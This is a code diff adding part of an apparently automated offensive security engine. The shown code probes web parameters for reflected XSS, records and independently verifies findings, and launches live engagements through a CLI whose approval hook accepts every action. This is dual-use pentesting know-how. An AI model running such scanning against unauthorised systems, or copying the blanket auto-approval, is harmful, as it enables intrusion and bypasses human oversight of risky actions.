+        by_url: dict[str, list[str]] = {}
+        for l in self._leads:
+            if l.param and l.param not in ("", None):
+                by_url.setdefault(l.url, [])
+                if len(by_url[l.url]) < 5 and l.param not in by_url[l.url]:
+                    by_url[l.url].append(l.param)
+        # search-ish paths with NO discovered param still get the bounded
+        # standard-param probe (q/query/s/search) — real operators do this
+        for l in self._leads:
+            if (l.kind == "path" and l.url and l.url not in by_url
+                    and re.search(r"search|query|find|list", l.url.lower())):
+                by_url[l.url] = ["q", "query", "s", "search"]
+        for url, params in by_url.items():
+            if not params:
+                continue
+            full = self._base + url if url.startswith("/") else url
+            res = self._run_tool("xss_reflect_probe", url=full, params=params,
+                                 reason="deterministic reflection map")
+            for lead in res.get("leads", []):
+                spec = lead.get("check_spec")
+                if not spec or not lead.get("specials_survive"):
+                    continue
+                res_v = self._run_tool(
+                    "verify_vulnerability",
+                    title=f"Reflected XSS at {url} ({lead.get('param')})",
+                    severity="medium", target=url,
+                    summary=f"Marker reflected unescaped in {lead.get('context')} "
+                            f"context; READY check_spec executed 1:1 by the "
+                            f"proof pipeline.",
+                    requests=spec.get("requests", {}),
+                    conditions=spec.get("conditions", []),
+                    cwe="CWE-79",
+                    recommendation="Contextual output encoding; CSP.")
+                if res_v.get("recorded"):
+                    hit = True
+        return hit
+
+    # -- verify pass (the pipeline's verdict, not the engine's) -----------------
+
+    def _verify_pass(self) -> dict:
+        pending = self._ctx.findings.pending()
+        out = {"pending_before": len(pending), "confirmed": 0,
+               "killed": 0, "still_pending": 0}
+        for f in pending:
+            res = _parse_json_loose(self._tool("verify_finding_independently")
+                                    .run(self._ctx, finding_id=f.id)) or {}
+            verdict = res.get("verdict", "not_reproducible")
+            if verdict == "confirmed":
+                out["confirmed"] += 1
+            elif verdict == "falsified":
+                out["killed"] += 1
+            else:
+                out["still_pending"] += 1
+            self._audit("offensive.verify.outcome", finding_id=f.id,
+                        verdict=verdict)
+        return out
+
+
+# ----------------------------------------------------------------------------
+# CLI — one live engagement, model-free
+# ----------------------------------------------------------------------------
+
+def main(argv: list[str] | None = None) -> int:  # pragma: no cover - live CLI
+    import argparse
+    ap = argparse.ArgumentParser(description="Deterministic offensive engine "
+                                             "(skills executed as code)")
+    ap.add_argument("--engagement", required=True)
+    ap.add_argument("--base-url", required=True)
+    ap.add_argument("--out", default="runs/offensive")
+    args = ap.parse_args(argv)
+    eng = load_engagement(args.engagement)
+    from .access import AccessGraph
+    from .audit import AuditLog
+    from .findings import FindingStore
+    from .inventory import AssetInventory
+    from .killchain import KillChain
+    from .knowledge import KnowledgeGraph
+    from .ratelimit import RateLimiter
+    from .scope import ScopeGuard
+    from .session import SessionStore
+    from .traffic import TrafficRecorder
+    out = Path(args.out)
+    out.mkdir(parents=True, exist_ok=True)
+    ctx = ToolContext(
+        scope=ScopeGuard(eng), limiter=RateLimiter(eng.max_requests_per_second,
+                                                   eng.max_total_requests),
+        audit=AuditLog(out / "audit.log.jsonl"), findings=FindingStore(out / "findings.json"),
+        approve=lambda action, details: True,  # isolated lab: engine only proves, never destroys
+        graph=KnowledgeGraph(out / "graph.json"), sessions=SessionStore(),
+        access=AccessGraph(out / "access.json"), objective=eng.objective,
+        killchain=KillChain(out / "killchain.json"),
+        traffic=TrafficRecorder(out / "traffic.jsonl"),
+        inventory=AssetInventory(out / "inventory.json"))
+    eng_obj = eng
+    engine = OffensiveEngine(eng_obj, ctx=ctx)
+    engine._base_override = args.base_url
+    summary = engine.run()
+    print(json.dumps(summary, indent=2, default=str))
+    print(f"artifacts under {out}")
+    return 0
+
+
+if __name__ == "__main__":  # pragma: no cover
+    raise SystemExit(main())
